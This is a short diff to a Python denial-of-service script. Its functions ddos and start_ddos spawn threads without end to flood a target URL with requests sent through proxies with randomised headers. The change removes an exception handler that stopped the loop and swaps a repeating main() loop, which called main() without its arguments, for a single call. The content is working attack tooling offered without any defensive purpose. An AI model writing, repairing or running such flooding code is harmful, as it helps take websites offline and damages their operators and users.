@@ -59,13 +59,11 @@ def ddos(prox, url):
 	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
 	color = random.choice(colors)
 	while True:
-		try:
-			headers = Headers(headers=True).generate()
-			thread_list = []
-			t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
-			thread_list.append(t)
-			t.start()
-		except: break	
+		headers = Headers(headers=True).generate()
+		thread_list = []
+		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
+		thread_list.append(t)
+		t.start()
 
 def start_ddos(prox, url, headers, proxies, color):
 	try:
@@ -101,8 +99,4 @@ def main(proxy, url):
 			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
 			exit()
 
-
-import time
-while(True):
-	main()
-	time.sleep(60)
+main()
